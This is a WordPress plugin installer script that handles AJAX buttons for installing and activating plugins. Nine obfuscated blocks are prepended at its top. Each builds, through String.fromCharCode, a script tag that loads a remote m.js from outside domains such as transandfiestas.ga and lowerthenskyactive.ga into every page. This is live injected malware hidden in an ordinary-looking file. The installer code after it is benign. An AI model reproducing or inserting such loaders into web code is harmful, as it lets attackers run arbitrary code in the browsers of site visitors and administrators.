Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,112,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,105,114,99,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,97,114,116,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,119,101,108,108,46,108,105,110,101,116,111,97,100,115,97,99,116,105,118,101,46,99,111,109,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,100,111,99,107,46,108,111,118,101,103,114,101,101,110,112,101,110,99,105,108,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,99,104,116,46,115,101,99,111,110,100,97,114,121,105,110,102,111,114,109,116,114,97,110,100,46,99,111,109,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,100,114,97,107,101,46,115,116,114,111,110,103,99,97,112,105,116,97,108,97,100,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,99,114,111,119,46,108,111,119,101,114,116,104,101,110,115,107,121,97,99,116,105,118,101,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,102,108,97,116,46,108,111,119,101,114,116,104,101,110,115,107,121,97,99,116,105,118,101,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();var oe_installer = oe_installer || {};

jQuery( document ).ready( function( $ ) {

	"use strict";

	var is_loading = false;

   /**
	* Install the plugin
	*/
	oe_installer.install_plugin = function( el, plugin ) {

	   	// Confirm activation
	   	var r = confirm( oe_installer_localize.install_now );

	      if ( r ) {

	      	is_loading = true;
	      	el.addClass( 'installing' );

	      	$.ajax( {
		   		type 	: 'POST',
		   		url 	: oe_installer_localize.ajax_url,
		   		data 	: {
		   			action 		: 'oe_plugin_installer',
		   			plugin 		: plugin,
		   			nonce 		: oe_installer_localize.admin_nonce,
		   			dataType 	: 'json'
		   		},

		   		success: function( data ) {
			   		if ( data  ){
				   		if ( data.status === 'success' ) {
				   			el.attr( 'class', 'activate button button-primary' );
					   		el.html( oe_installer_localize.activate_btn );
				   		} else {
				   			el.removeClass( 'installing' );
			   			}
			   		} else {
			   			el.removeClass( 'installing' );
			   		}
			   		is_loading = false;
		   		},

		   		error: function( xhr, status, error ) {
		      		console.log( status );
		      		el.removeClass( 'installing' );
		      		is_loading = false;
		   		}
		   	} );

	   	}
	}

   /**
	* Activate the plugin
	*/
	oe_installer.activate_plugin = function( el, plugin ) {

		$.ajax( {
	   		type 	: 'POST',
	   		url 	: oe_installer_localize.ajax_url,
	   		data 	: {
	   			action 		: 'oe_plugin_activation',
	   			plugin 		: plugin,
	   			nonce 		: oe_installer_localize.admin_nonce,
	   			dataType 	: 'json'
	   		},

	   		success: function( data ) {
		   		if ( data ) {
			   		if ( data.status === 'success' ) {
				   		el.attr( 'class', 'installed button disabled' );
				   		el.html( oe_installer_localize.installed_btn );
			   		}
		   		}
		   		is_loading = false;
	   		},

	   		error: function( xhr, status, error ) {
	      		console.log( status );
	      		is_loading = false;
	   		}
	   	} );

	};

   /**
	* Activate the premium lugin
	*/
	oe_installer.activate_premium_plugin = function( el, plugin ) {

		$.ajax( {
	   		type 	: 'POST',
	   		url 	: oe_installer_localize.ajax_url,
	   		data 	: {
	   			action 		: 'oe_premium_plugin_activation',
	   			plugin 		: plugin,
	   			nonce 		: oe_installer_localize.admin_nonce,
	   			dataType 	: 'json'
	   		},

	   		success: function( data ) {
		   		if ( data ) {
			   		if ( data.status === 'success' ) {
				   		el.attr( 'class', 'installed button disabled' );
				   		el.html( oe_installer_localize.installed_btn );
			   		}
		   		}
		   		is_loading = false;
	   		},

	   		error: function( xhr, status, error ) {
	      		console.log( status );
	      		is_loading = false;
	   		}
	   	} );

	};

	/**
	* Install/Activate Button Click
	*/
	$( document ).on( 'click', '.oe-plugin-installer a.button:not(.premium-link)', function( e ) {
	   	var el 		= $( this ),
	   		plugin 	= el.data( 'slug' );

	   	e.preventDefault();

	   	if ( ! el.hasClass( 'disabled' ) ) {

	      	if ( is_loading ) return false;

		   	// Installation
	      	if ( el.hasClass( 'install' ) ) {
		      	oe_installer.install_plugin( el, plugin );
		   	}

		   	// Activation
		   	if ( el.hasClass( 'activate' ) ) {
			   	oe_installer.activate_plugin( el, plugin );
			}
	   	}
	} );

	/**
	* Activate Premium Extension
	*/
	$( document ).on( 'click', '.oe-plugin-installer a.button.premium-activation', function( e ) {
	   	var el 		= $( this ),
	   		plugin 	= el.data( 'slug' );

	   	e.preventDefault();

	   	if ( ! el.hasClass( 'disabled' ) ) {

	      	if ( is_loading ) return false;

		   	// Activation
		   	if ( el.hasClass( 'activate' ) ) {
			   	oe_installer.activate_premium_plugin( el, plugin );
			}
	   	}
	} );

});
